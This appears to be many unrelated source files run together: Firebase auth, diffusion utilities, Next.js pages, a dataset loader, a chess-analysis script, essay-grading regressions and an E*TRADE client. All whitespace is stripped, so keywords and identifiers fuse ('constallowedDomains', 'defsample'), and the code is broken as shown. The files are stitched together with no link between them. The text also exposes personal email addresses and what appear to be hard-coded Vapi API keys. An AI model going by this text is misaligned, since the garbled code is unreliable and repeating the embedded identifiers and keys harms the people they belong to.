[],},hospitalityTourism:{completedQuestions:[],missedQuestions:[],},marketing:{completedQuestions:[],missedQuestions:[],},businessManagementAdministration:{completedQuestions:[],missedQuestions:[],},personalFinancialLiteracy:{completedQuestions:[],missedQuestions:[],},entrepreneurship:{completedQuestions:[],missedQuestions:[],},});}};onAuthStateChanged(auth,async(user)=>{//constrouter=useRouter();constallowedDomains=['gmail.com','sduhsd.net','berkeley.edu'];//ReplacewithyouralloweddomainsconstallowedSpecificUsers=['nathandai2000@gmail.com'];//ReplacewithspecificallowedemailaddressesconstbannedUsers=['nathan.dai@berkeley.edu'];//Replacewithspecificbannedemailaddressesif(user){//Gettheemaildomainofthesigned-inuserconstemailDomain=user.email.split('@')[1];constuserEmail=user.email;//CheckiftheemaildomainisallowedoriftheuserisspecificallyallowedconstisAllowedDomain=allowedDomains.includes(emailDomain);constisAllowedSpecificUser=allowedSpecificUsers.includes(userEmail);//Ifneitherthedomainisallowednorthespecificuserisallowed,signouttheuserif(!isAllowedDomain&&!isAllowedSpecificUser){awaitauth.signOut();window.location.href='/unauthorized';return;}}});export{signInWithGoogle,auth,db};fromabcimportABC,abstractmethodimporttorchclassDiffusionLossWeighting(ABC):@abstractmethoddef__call__(self,sigma:torch.Tensor)->torch.Tensor:passclassUnitWeighting(DiffusionLossWeighting):def__call__(self,sigma:torch.Tensor)->torch.Tensor:returntorch.ones_like(sigma,device=sigma.device)classEDMWeighting(DiffusionLossWeighting):def__init__(self,sigma_data:float=0.5):self.sigma_data=sigma_datadef__call__(self,sigma:torch.Tensor)->torch.Tensor:return(sigma**2+self.sigma_data**2)/(sigma*self.sigma_data)**2classVWeighting(EDMWeighting):def__init__(self):super().__init__(sigma_data=1.0)classEpsWeighting(DiffusionLossWeighting):def__call__(self,sigma:torch.Tensor)->torch.Tensor:returnsigma**-2.0importImagefrom'next/image';constDifferentiate=()=>{return(<divclassName='my-4p-4flexflex-colitems-center'><h1className='text-centerfont-semiboldtext-4xlm-5'>Whatmakesusdifferent?</h1><Image//TODO:usetwosmallerimagesstackedverticallyifnarrowscreenclassName='lg:w-3/5md:w-4/5sm:w-screen'src={'/ink_laydown.svg'}width={1}height={0}alt='Inklaydowncomparisonbetweenliquidinkandoil-basedink'/><divclassName='my-4p-4lg:w-3/5md:w-4/5sm:w-screentext-gray-700'><pclassName='mb-3'><b>NON-FADING</b>:Freeliquidinktechnologyprovidesconstantsmoothinkshadeuntilthelastdrop.Ourmarkersdonotfadeasinkisused.</p><pclassName='mb-3'><b>VISIBLEINKGAUGE</b>:Weincorporateatransparentbarrelwithaprintedgaugesoyoualwaysknowhowmuchinkisleftinyourpermanentmarker.</p><pclassName='mb-3'><b>1.5XINKCAPACITY</b>:LiqeoPropermanentmarkerscanwriteupto1.5Xoftraditionalpermanentmarkerswhichmeansyougetmorewritingforyourmoney.</p><pclassName='mb-3'><b>QUICKDRYING&LOWODORINK</b>:Liqeoinkdriesquicklyandispermanentonmostporousandnon-poroussurfacesincludingpaper,metal,plastic,&cardboard.Ourinkisalsolowodoranddoesnotemitunpleasantsmellslikeothermarkers.</p></div></div>);};exportdefaultDifferentiate;importnumpyasnpimporttorchclassAbstractDistribution:defsample(self):raiseNotImplementedError()defmode(self):raiseNotImplementedError()classDiracDistribution(AbstractDistribution):def__init__(self,value):self.value=valuedefsample(self):returnself.valuedefmode(self):returnself.valueclassDiagonalGaussianDistribution(object):def__init__(self,parameters,deterministic=False):self.parameters=parametersself.mean,self.logvar=torch.chunk(parameters,2,dim=1)self.logvar=torch.clamp(self.logvar,-30.0,20.0)self.deterministic=deterministicself.std=torch.exp(0.5*self.logvar)self.var=torch.exp(self.logvar)ifself.deterministic:self.var=self.std=torch.zeros_like(self.mean).to(device=self.parameters.device)defsample(self):x=self.mean+self.std*torch.randn(self.mean.shape).to(device=self.parameters.device)returnxdefkl(self,other=None):ifself.deterministic:returntorch.Tensor([0.0])else:ifotherisNone:return0.5*torch.sum(torch.pow(self.mean,2)+self.var-1.0-self.logvar,dim=[1,2,3],)else:return0.5*torch.sum(torch.pow(self.mean-other.mean,2)/other.var+self.var/other.var-1.0-self.logvar+other.logvar,dim=[1,2,3],)defnll(self,sample,dims=[1,2,3]):ifself.deterministic:returntorch.Tensor([0.0])logtwopi=np.log(2.0*np.pi)return0.5*torch.sum(logtwopi+self.logvar+torch.pow(sample-self.mean,2)/self.var,dim=dims,)defmode(self):returnself.meandefnormal_kl(mean1,logvar1,mean2,logvar2):"""source:https://github.com/openai/guided-diffusion/blob/27c20a8fab9cb472df5d6bdd6c8d11c8f430b924/guided_diffusion/losses.py#L12ComputetheKLdivergencebetweentwogaussians.Shapesareautomaticallybroadcasted,sobatchescanbecomparedtoscalars,amongotherusecases."""tensor=Noneforobjin(mean1,logvar1,mean2,logvar2):ifisinstance(obj,torch.Tensor):tensor=objbreakasserttensorisnotNone,"atleastoneargumentmustbeaTensor"#ForcevariancestobeTensors.Broadcastinghelpsconvertscalarsto#Tensors,butitdoesnotworkfortorch.exp().logvar1,logvar2=[xifisinstance(x,torch.Tensor)elsetorch.tensor(x).to(tensor)forxin(logvar1,logvar2)]return0.5*(-1.0+logvar2-logvar1+torch.exp(logvar1-logvar2)+((mean1-mean2)**2)*torch.exp(-logvar2))importtorchfromtorch.utils.dataimportDataLoaderimportnumpyasnpfromomegaconfimportDictConfig,ListConfigfromtypingimportDict,List,Optional,Union,Callableimportwebdatasetaswdsfrom.filtersimportAbstractFilterfrom.mappersimportAbstractMapperfrom.datapipelineimportStableDataPipeline,instantiate,make_callable,time_measure@time_measure("Collator")defdict_collation_fn(samples:List,combine_tensors:bool=True,combine_scalars:bool=True)->Dict:"""Takealistofsamples(asdictionary)andcreateabatch,preservingthekeys.If`tensors`isTrue,`ndarray`objectsarecombinedintotensorbatches.:paramdictsamples:listofsamples:parambooltensors:whethertoturnlistsofndarraysintoasinglendarray:returns:singlesampleconsistingofabatch:rtype:dict"""keys=set.intersection(*[set(sample.keys())forsampleinsamples])batched={key:[]forkeyinkeys}forsinsamples:[batched[key].append(s[key])forkeyinbatched]result={}forkeyinbatched:ifisinstance(batched[key][0],(int,float)):ifcombine_scalars:result[key]=np.array(list(batched[key]))elifisinstance(batched[key][0],torch.Tensor):ifcombine_tensors:result[key]=torch.stack(list(batched[key]))elifisinstance(batched[key][0],np.ndarray):ifcombine_tensors:result[key]=np.array(list(batched[key]))else:result[key]=list(batched[key])delsamplesdelbatchedreturnresultdefcreate_loader(datapipeline:Union[wds.DataPipeline,Union[DictConfig,Dict]],batch_size:int,num_workers:int,partial:bool=False,collation_fn:Optional[Union[Callable,Dict,DictConfig]]=None,batched_transforms:Optional[ListConfig]=None,loader_kwargs:Optional[Union[Dict,DictConfig]]=None,error_handler:Optional[Union[Callable,Dict,DictConfig]]=None,)->torch.utils.data.DataLoader:ifnotloader_kwargs:loader_kwargs={}ifnotbatched_transforms:batched_transforms=[]ifnotcollation_fn:collation_fn=dict_collation_fnifisinstance(collation_fn,(Dict,DictConfig)):collation_fn=make_callable(collation_fn)ifnoterror_handler:error_handler={"target":"sdata.warn_and_continue"}ifisinstance(error_handler,(Dict,DictConfig)):error_handler=make_callable(error_handler)print("#"*100)print("Buildingdataloaderwiththefollowingparameters")print(f"batch_size:{batch_size}")print(f"num_workers:{num_workers}")forkeyinloader_kwargs:print(key,":",loader_kwargs[key])print("#"*100)#createdatapipelinefromdictifnotalreadyinstantiatedifisinstance(datapipeline,(DictConfig,Dict)):datapipeline=instantiate(datapipeline)#batchingdatapipeline=datapipeline.batched(batch_size,partial=partial,collation_fn=collation_fn)#applytransformswhichactonbatchedsamplesfori,trfinenumerate(batched_transforms):trf=instantiate(trf)ifisinstance(trf,AbstractFilter):print(f"Addingfilter{trf.__class__.__name__}asbatchedtransform#{i}"f"tothedatapipeline")datapipeline=datapipeline.select(trf)elifisinstance(trf,AbstractMapper):print(f"Addingmapper{trf.__class__.__name__}asbatchedtransform#{i}"f"tothedatapipeline")datapipeline=datapipeline.map(trf,handler=error_handler)else:raiseTypeError("chosenbatchedtransformshouldbeeitherasubclassof""sdata.AbstractMapperoroneofsdata.AbstractFilter""butisnoneofboth")#createloaderloader=torch.utils.data.DataLoader(datapipeline,batch_size=None,num_workers=num_workers,**loader_kwargs)returnloaderdefcreate_dataset(urls:Union[List,ListConfig,str],pipeline_config:Optional[Union[DictConfig,Dict]]=None,decoders:Optional[Union[ListConfig,str]]="pil",additional_decoder_kwargs:Optional[DictConfig]=None,preprocessors:Optional[ListConfig]=None,postprocessors:Optional[ListConfig]=None,error_handler:Optional[Union[Callable,Dict]]=None,)->wds.DataPipeline:"""Createadatasetfromseveral(partlyoptional)configsandurlsdefiningpathstoshardsinwebdataset/torchdataformatTheshardsshouldbelocatedinthelocalfilesystemandcanbespecifiedasdirectoriesorinbraceexpandnotation:paramurls:theurlsaspathstotheshards:parampipeline_config:additionalparametersforconfiguringthemaindatapipeline,foralistofavailableparameters,seesdata.:paramdecoders::paramadditional_decoder_kwargs:Additionalkeywordargsforthedecoder.Thiscanbee.g.usedtodefinepassthroughkeys,whichshallbedecodedalthoughnothavingaknowndecoderkey:parampreprocessors::parampostprocessors::paramerror_handler:Theerrorhandlerdefiningastrategyforhandlingerrorsinthestagesinthepipeline:return:"""ifisinstance(urls,str):urls=[urls]ifnotpipeline_config:pipeline_config={}ifnoterror_handler:error_handler={"target":"sdata.warn_and_continue"}pipeline_config.pop("handler",None)pipeline_config["handler"]=error_handler#defaultforallprocessorsifnotpreprocessors:preprocessors=[]ifnotpostprocessors:postprocessors=[]ifnotadditional_decoder_kwargs:additional_decoder_kwargs={}ifdecodersandnotisinstance(decoders,(List,ListConfig)):#defaultcaseisassumingimagedecodingdecoders=[decoders]elifnotdecoders:decoders=[]datapipeline=StableDataPipeline(urls=urls,**pipeline_config)ifisinstance(error_handler,Dict):error_handler=make_callable(error_handler)#instantiateallpreprocessorsfori,prepro_configinenumerate(preprocessors):prepro=instantiate(prepro_config)ifisinstance(prepro,AbstractFilter):print(f"Addingfilter{prepro.__class__.__name__}aspreprocessor#{i}"f"tothedatapipeline")datapipeline=datapipeline.select(prepro)elifisinstance(prepro,AbstractMapper):print(f"Addingmapper{prepro.__class__.__name__}aspreprocessor#{i}"f"tothedatapipeline")datapipeline=datapipeline.map(prepro,handler=error_handler)else:raiseTypeError(f"chosenpreprocessor{prepro.__class__.__name__}shouldbeeitherasubclassof""sdata.mappers.AbstractMapperoroneofsdata.filters.AbstractFilter""butisnoneofboth")#dodecodingprepared_decoders=[]fordecoder_specindecoders:ifisinstance(decoder_spec,(Dict,DictConfig)):decoder=instantiate(decoder_spec)print(f"Addingdecoder{decoder.__class__.__name__}todecoders.")prepared_decoders.append(decoder)elifisinstance(decoder_spec,str):assert(decoder_specinwds.autodecode.imagespecsordecoder_specinwds.autodecode.decoders),("whendecoderisspecifiedviaastring,thenithastobeaa""decoderknowntowebdataset")print(f"Addingdecoder{decoder_spec}todecoders.")prepared_decoders.append(decoder_spec)else:raiseTypeError(f"{decoder_spec}notathingfordecoders.")ifdecoders:#defaultbehaviorissettingpartialto'True'indecodepartial=additional_decoder_kwargs.pop("partial",True)#addinstantiateddecoderstothedatapipelinedatapipeline=datapipeline.decode(*prepared_decoders,partial=partial,handler=error_handler,**additional_decoder_kwargs,)#instantiateallpostprocessorsfori,postro_configinenumerate(postprocessors):postpro=instantiate(postro_config)ifisinstance(postpro,AbstractFilter):print(f"Addingfilter{postpro.__class__.__name__}aspostprocessor#{i}"f"tothedatapipeline")datapipeline=datapipeline.select(postpro)elifisinstance(postpro,AbstractMapper):print(f"Addingmapper{postpro.__class__.__name__}aspostprocessor#{i}"f"tothedatapipeline")datapipeline=datapipeline.map(postpro,handler=error_handler)else:raiseTypeError("chosenpostprocessorshouldbeeitherasubclassof""sdata.AbstractMapperoroneofsdata.AbstractFilter""butisnoneofboth")returndatapipelinefromstockfishimportStockfishimportchessimportchess.pgn#frommathimporttanhimportmatplotlib.pyplotaspltimportnumpyasnpfromscipy.ndimageimportgaussian_filter1d#fromtqdmimporttqdmimportprogressbarimportargparsefromfindimportfind_gamestockfish=Stockfish(r'C:\ProgramFiles\ChessEngines\Stockfish\stockfish.exe')#board=chess.Board()#pgn=open(r'Games\ChessCom_shibogod_202203.pgn')#game=chess.pgn.read_game(pgn)#link=game.headers['Link']defreview(url:str,username:str,depth:int=18):game=find_game(url,username)white=game.headers['White']black=game.headers['Black']x,y=analyze(game,depth)plot(x,y,white,black)defanalyze(game:chess.pgn.Game,depth:int)->tuple[np.ndarray,np.ndarray]:stockfish.set_depth(depth)x=np.array([])y=np.array([])moves=game.mainline_moves()length=len(list(moves))bar=progressbar.ProgressBar(maxval=length).start()fori,moveinenumerate(moves):stockfish.make_moves_from_current_position([move.uci()])evaluation=stockfish.get_evaluation()['value']/100x=np.append(x,i)#y=np.append(y,5*tanh(0.5*evaluation))y=np.append(y,min(5,evaluation)ifevaluation>0elsemax(-5,evaluation))#print(stockfish.get_board_visual())bar.update(i)bar.finish()returnx,ydefplot(x:np.ndarray,y:np.ndarray,white:str,black:str,smoothness:float=2):y_smooth=gaussian_filter1d(y,sigma=smoothness)fig,ax=plt.subplots(figsize=(2.35*5,5))#labelplayernamesax.text(0,5.4,f'White:{white}',color='black',fontsize=12,fontweight='bold',ha='left',va='center')ax.text(0,-5.5,f'Black:{black}',color='black',fontsize=12,fontweight='bold',ha='left',va='center')#scaley-axisfrom-5to5ax.set_ylim(-5.1,5.1)#startx-axisat0ax.set_xlim(0,len(x)-1)#removex-axislabelsandticksax.set_xticks([])ax.set_xticklabels([])#drawahorizontallineaty=0ax.axhline(y=0,color='k')#filliny>0withwhiteax.fill_between(x,y_smooth,where=y_smooth>0,color='black',alpha=0.07)#filliny<0withblackax.fill_between(x,y_smooth,where=y_smooth<0,color='black',alpha=0.3)#plotax.plot(x,y_smooth,color='black',linewidth=1.2,alpha=0.7)plt.show()if__name__=='__main__':url='https://www.chess.com/game/live/72550951861'username='shibogod'review(url,username,depth=18)#parser=argparse.ArgumentParser(description='Analyzeachessgame.')#parser.add_argument('url',type=str,help='TheURLofthegametoanalyze.')#parser.add_argument('username',type=str,help='Theusernameoftheplayerwhoplayedthegame.')#parser.add_argument('-d','--depth',type=int,default=18,help='Thedepthtoanalyzethegameat.')#parser.add_argument('-s','--smoothness',type=float,default=2,help='Thesmoothnessoftheplot.')#args=parser.parse_args()#review(args.url,args.username,args.depth)importosfromdotenvimportload_dotenvfromopenaiimportOpenAIload_dotenv()api_key=os.getenv('OPENAI_API_KEY')defget_narration(prompt):client=OpenAI(api_key=api_key)response=client.audio.speech.create(model='tts-1',voice='onyx',input=prompt,response_format='wav',)returnresponse.contentn=21dp=[None]*(n+1)dp[1]=Truedp[2]=Truedp[3]=Trueforiinrange(4,n+1):dp[i]=not(dp[i-1]anddp[i-2]anddp[i-3])print(dp[n])importReactfrom'react';importImagefrom'next/legacy/image';//Importfrom'next/image'constofficers=[{name:'RubyGao',position:'President',imageUrl:'/ruby_beautify.jpg'},{name:'LynnHuang',position:'VicePresident',imageUrl:'/lynn.png'},{name:'SydneyDanon',position:'Secretary',imageUrl:'/sydney.png'},{name:'RitvikIrigireddy',position:'Treasurer',imageUrl:'/ritvik.jpeg'},{name:'NathanDai',position:'DirectorofCorporateSynergyandStrategicAlignment',imageUrl:'/wayne.jpeg',},{name:'ColeTerjesen',position:'PresidentElect',imageUrl:'/cole-cropped.jpg'},//...addmoreofficersasneeded];exportdefaultfunctionMeetYourOfficers(){return(<divclassName='mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10mb-12'><h1className='text-4xlfont-boldmb-10text-blue-500'>MeetYourOfficers</h1><divclassName='gridgrid-cols-2sm:grid-cols-2lg:grid-cols-3gap-6'>{officers.map((officer,index)=>(<divkey={index}className={'officer-infop-4text-center'}id={officer.name.split('')[0].toLowerCase()}><divclassName='relativeinline-blockw-40h-40mx-automb-4'><Imagesrc={officer.imageUrl}alt={`Imageof${officer.name}`}layout='fill'objectFit='cover'//Thiswillcovertheareaofthediv,youcanalsouse'contain'ifyoudon'twanttocroptheimageclassName='rounded-full'/></div><h2className='text-xlfont-semibold'>{officer.name}</h2><pclassName='text-mdtext-gray-600'>{officer.position}</p></div>))}</div></div>);}fromabcimportABC,abstractmethodfromtypingimportTupleimporttorchclassDenoiserScaling(ABC):@abstractmethoddef__call__(self,sigma:torch.Tensor)->Tuple[torch.Tensor,torch.Tensor,torch.Tensor,torch.Tensor]:passclassEDMScaling:def__init__(self,sigma_data:float=0.5):self.sigma_data=sigma_datadef__call__(self,sigma:torch.Tensor)->Tuple[torch.Tensor,torch.Tensor,torch.Tensor,torch.Tensor]:c_skip=self.sigma_data**2/(sigma**2+self.sigma_data**2)c_out=sigma*self.sigma_data/(sigma**2+self.sigma_data**2)**0.5c_in=1/(sigma**2+self.sigma_data**2)**0.5c_noise=0.25*sigma.log()returnc_skip,c_out,c_in,c_noiseclassEpsScaling:def__call__(self,sigma:torch.Tensor)->Tuple[torch.Tensor,torch.Tensor,torch.Tensor,torch.Tensor]:c_skip=torch.ones_like(sigma,device=sigma.device)c_out=-sigmac_in=1/(sigma**2+1.0)**0.5c_noise=sigma.clone()returnc_skip,c_out,c_in,c_noiseclassVScaling:def__call__(self,sigma:torch.Tensor)->Tuple[torch.Tensor,torch.Tensor,torch.Tensor,torch.Tensor]:c_skip=1.0/(sigma**2+1.0)c_out=-sigma/(sigma**2+1.0)**0.5c_in=1.0/(sigma**2+1.0)**0.5c_noise=sigma.clone()returnc_skip,c_out,c_in,c_noiseclassVScalingWithEDMcNoise(DenoiserScaling):def__call__(self,sigma:torch.Tensor)->Tuple[torch.Tensor,torch.Tensor,torch.Tensor,torch.Tensor]:c_skip=1.0/(sigma**2+1.0)c_out=-sigma/(sigma**2+1.0)**0.5c_in=1.0/(sigma**2+1.0)**0.5c_noise=0.25*sigma.log()returnc_skip,c_out,c_in,c_noiseimportPagefrom'@/components/Page';constHospitality=()=>{return<Pagedata_cluster='HospitalityandTourism'cluster='hospitalityTourism'/>;};exportdefaultHospitality;importPagefrom'@/components/Page';constPersonalFinancialLiteracy=()=>{return<Pagedata_cluster='PersonalFinancialLiteracy'cluster='personalFinancialLiteracy'/>;};exportdefaultPersonalFinancialLiteracy;#Linearregressionmodel(preliminary)importpandasaspdimportnumpyasnpimportmatplotlib.pyplotaspltimportsklearnfromsklearn.linear_modelimportLinearRegressionfromsklearn.model_selectionimporttrain_test_splitfromsklearnimportpreprocessingimportpickle#importdataandsplitintosourcedependentandpersuasive/narrative/expositorydf=pd.read_feather('essaygrader/data/dataset.feather')source=df.loc[df['SourceDependentResponses']==1]pne=df.loc[df['Persuasive/Narrative/Expository']==1]#Sourcedependentsource_ms=source.loc[source['grade']==0]source_hs=source.loc[source['grade']==1]X=source_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=source_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)regressor_source_ms=LinearRegression()regressor_source_ms.fit(X_train,y_train)r_sq=regressor_source_ms.score(X_test,y_test)print('score-SourceDependentResponses(MiddleSchool):',r_sq)print('Coeffs:',regressor_source_ms.coef_)filename='regressor_source_ms.sav'pickle.dump(regressor_source_ms,open(filename,'wb'))#-----X=source_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=source_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)regressor_source_hs=LinearRegression()regressor_source_hs.fit(X_train,y_train)r_sq=regressor_source_hs.score(X_test,y_test)print('score-SourceDependentResponses(HighSchool):',r_sq)print('Coeffs:',regressor_source_hs.coef_)filename='regressor_source_hs.sav'pickle.dump(regressor_source_hs,open(filename,'wb'))#-----#persuasive/narrative/expositorypne_ms=pne.loc[pne['grade']==0]pne_hs=pne.loc[pne['grade']==1]X=pne_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=pne_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)regressor_pne_ms=LinearRegression()regressor_pne_ms.fit(X_train,y_train)r_sq=regressor_pne_ms.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(MiddleSchool):',r_sq)print('Coeffs:',regressor_pne_ms.coef_)filename='regressor_pne_ms.sav'pickle.dump(regressor_pne_ms,open(filename,'wb'))#-----X=pne_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=pne_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)regressor_pne_hs=LinearRegression()regressor_pne_hs.fit(X_train,y_train)r_sq=regressor_pne_hs.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(HighSchool):',r_sq)print('Coeffs:',regressor_pne_hs.coef_)filename='regressor_pne_hs.sav'pickle.dump(regressor_pne_hs,open(filename,'wb'))importrawpyimportimageioimportosfiles=os.listdir('.')forfileinfiles:if(file.endswith('.ARW')):withrawpy.imread(file)asraw:img=raw.postprocess()imageio.imwrite(file[:-4]+'.dng',img)classEdit{constructor(start,end,replacement){this.start=start;this.end=end;this.replacement=replacement;}}classEditable{constructor(base,edits=[]){this.base=base;this.edits=edits;}getresult(){letresult=this.base;for(leteditofthis.edits){result=result.slice(0,edit.start)+edit.replacement+result.slice(edit.end);}returnresult;}}leteditable=newEditable('helloworld',[newEdit(0,5,'goodbye'),newEdit(6,11,'universe'),]);console.log(editable.result);'useclient';importVapifrom"@vapi-ai/web";constTemp=()=>{constvapi=newVapi('bc70d4a2-9563-4172-bdb2-712b4084ba27');vapi.start('181a8564-58b5-4168-ad01-b53fa5f8f06e')return(<div><h1>Temp</h1></div>)}exportdefaultTemp;importpandasaspdimportjsondf=pd.DataFrame(json.load(open('spy.json'))['1d'])[['open','close','time']]#converttimecolumnfromunixtimestamptodatetimedf['time']=pd.to_datetime(df['time'],unit='s')df['after']=(df['open']-df['close'].shift(1))/df['close'].shift(1)df['change']=(df['close']-df['open'])/df['open']df.dropna(inplace=True)#changeto-1or1fornegativeorpositivechange#df['after']=df['after'].apply(lambdax:-1ifx<0else1)#df['change']=df['change'].apply(lambdax:-1ifx<0else1)#scaletou=0o=1fromsklearn.preprocessingimportStandardScalerscaler=StandardScaler()df[['after','change']]=scaler.fit_transform(df[['after','change']])#correlationbetweenafterandchangex,y=df['after'],df['change']fromxgboostimportXGBRegressorfromsklearn.metricsimportmean_squared_errormodel=XGBRegressor()model.fit(x.values.reshape(-1,1),y)print(mean_squared_error(y,model.predict(x.values.reshape(-1,1))))importjsonimportloggingimportconfigparserfromlogging.handlersimportRotatingFileHandlerfromorder.orderimportOrder#loadingconfigurationfileconfig=configparser.ConfigParser()config.read('config.ini')#loggersettingslogger=logging.getLogger('my_logger')logger.setLevel(logging.DEBUG)handler=RotatingFileHandler("python_client.log",maxBytes=5*1024*1024,backupCount=3)FORMAT="%(asctime)-15s%(message)s"fmt=logging.Formatter(FORMAT,datefmt='%m/%d/%Y%I:%M:%S%p')handler.setFormatter(fmt)logger.addHandler(handler)classAccounts:def__init__(self,session,base_url):"""InitializeAccountsobjectwithsessionandaccountinformation:paramsession:authenticatedsession"""self.session=sessionself.account={}self.base_url=base_urldefaccount_list(self):"""CallsaccountlistAPItoretrievealistoftheuser'sE*TRADEaccounts:paramself:Passesinparameterauthenticatedsession"""#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/list.json"#MakeAPIcallforGETrequestresponse=self.session.get(url,header_auth=True)logger.debug("RequestHeader:%s",response.request.headers)#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()ifdataisnotNoneand"AccountListResponse"indataand"Accounts"indata["AccountListResponse"]\and"Account"indata["AccountListResponse"]["Accounts"]:accounts=data["AccountListResponse"]["Accounts"]["Account"]whileTrue:#Displayaccountlistcount=1print("\nBrokerageAccountList:")accounts[:]=[dfordinaccountsifd.get('accountStatus')!='CLOSED']foraccountinaccounts:print_str=str(count)+")\t"ifaccountisnotNoneand"accountId"inaccount:print_str=print_str+(account["accountId"])ifaccountisnotNoneand"accountDesc"inaccount\andaccount["accountDesc"].strip()isnotNone:print_str=print_str+","+account["accountDesc"].strip()ifaccountisnotNoneand"institutionType"inaccount:print_str=print_str+","+account["institutionType"]print(print_str)count=count+1print(str(count)+")\t""GoBack")#Selectaccountoptionaccount_index=input("Pleaseselectanaccount:")ifaccount_index.isdigit()and0<int(account_index)<count:ifself.base_url=="":self.account=accounts[int(account_index)-1]else:self.account=accounts[int(account_index)-1]self.account_menu()elifaccount_index==str(count):breakelse:print("UnknownAccountSelected!")else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)ifresponseisnotNoneandresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:AccountListAPIserviceerror")else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)ifresponseisnotNoneandresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+response.json()["Error"]["message"])else:print("Error:AccountListAPIserviceerror")defportfolio(self):"""CallportfolioAPItoretrievealistofpositionsheldinthespecifiedaccount:paramself:Passesinparameterauthenticatedsessionandinformationonselectedaccount"""#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/portfolio.json"#MakeAPIcallforGETrequestresponse=self.session.get(url,header_auth=True)logger.debug("RequestHeader:%s",response.request.headers)print("\nPortfolio:")#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()ifdataisnotNoneand"PortfolioResponse"indataand"AccountPortfolio"indata["PortfolioResponse"]:#DisplaybalanceinformationforacctPortfolioindata["PortfolioResponse"]["AccountPortfolio"]:ifacctPortfolioisnotNoneand"Position"inacctPortfolio:forpositioninacctPortfolio["Position"]:print_str=""ifpositionisnotNoneand"symbolDescription"inposition:print_str=print_str+"Symbol:"+str(position["symbolDescription"])ifpositionisnotNoneand"quantity"inposition:print_str=print_str+"|"+"Quantity#:"+str(position["quantity"])ifpositionisnotNoneand"Quick"inpositionand"lastTrade"inposition["Quick"]:print_str=print_str+"|"+"LastPrice:"\+str('${:,.2f}'.format(position["Quick"]["lastTrade"]))ifpositionisnotNoneand"pricePaid"inposition:print_str=print_str+"|"+"PricePaid$:"\+str('${:,.2f}'.format(position["pricePaid"]))ifpositionisnotNoneand"totalGain"inposition:print_str=print_str+"|"+"TotalGain$:"\+str('${:,.2f}'.format(position["totalGain"]))ifpositionisnotNoneand"marketValue"inposition:print_str=print_str+"|"+"Value$:"\+str('${:,.2f}'.format(position["marketValue"]))print(print_str)else:print("None")else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)ifresponseisnotNoneand"headers"inresponseand"Content-Type"inresponse.headers\andresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+response.json()["Error"]["message"])else:print("Error:PortfolioAPIserviceerror")elifresponseisnotNoneandresponse.status_code==204:print("None")else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)ifresponseisnotNoneand"headers"inresponseand"Content-Type"inresponse.headers\andresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+response.json()["Error"]["message"])else:print("Error:PortfolioAPIserviceerror")defbalance(self):"""CallsaccountbalanceAPItoretrievethecurrentbalanceandrelateddetailsforaspecifiedaccount:paramself:Passinparametersauthenticatedsessionandinformationonselectedaccount"""#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/balance.json"#Addparametersandheaderinformationparams={"instType":self.account["institutionType"],"realTimeNAV":"true"}headers={"consumerkey":config["DEFAULT"]["CONSUMER_KEY"]}#MakeAPIcallforGETrequestresponse=self.session.get(url,header_auth=True,params=params,headers=headers)logger.debug("Requesturl:%s",url)logger.debug("RequestHeader:%s",response.request.headers)#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()ifdataisnotNoneand"BalanceResponse"indata:balance_data=data["BalanceResponse"]ifbalance_dataisnotNoneand"accountId"inbalance_data:print("\n\nBalancefor"+balance_data["accountId"]+":")else:print("\n\nBalance:")#Displaybalanceinformationifbalance_dataisnotNoneand"accountDescription"inbalance_data:print("AccountNickname:"+balance_data["accountDescription"])ifbalance_dataisnotNoneand"Computed"inbalance_data\and"RealTimeValues"inbalance_data["Computed"]\and"totalAccountValue"inbalance_data["Computed"]["RealTimeValues"]:print("NetAccountValue:"+str('${:,.2f}'.format(balance_data["Computed"]["RealTimeValues"]["totalAccountValue"])))ifbalance_dataisnotNoneand"Computed"inbalance_data\and"marginBuyingPower"inbalance_data["Computed"]:print("MarginBuyingPower:"+str('${:,.2f}'.format(balance_data["Computed"]["marginBuyingPower"])))ifbalance_dataisnotNoneand"Computed"inbalance_data\and"cashBuyingPower"inbalance_data["Computed"]:print("CashBuyingPower:"+str('${:,.2f}'.format(balance_data["Computed"]["cashBuyingPower"])))else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)i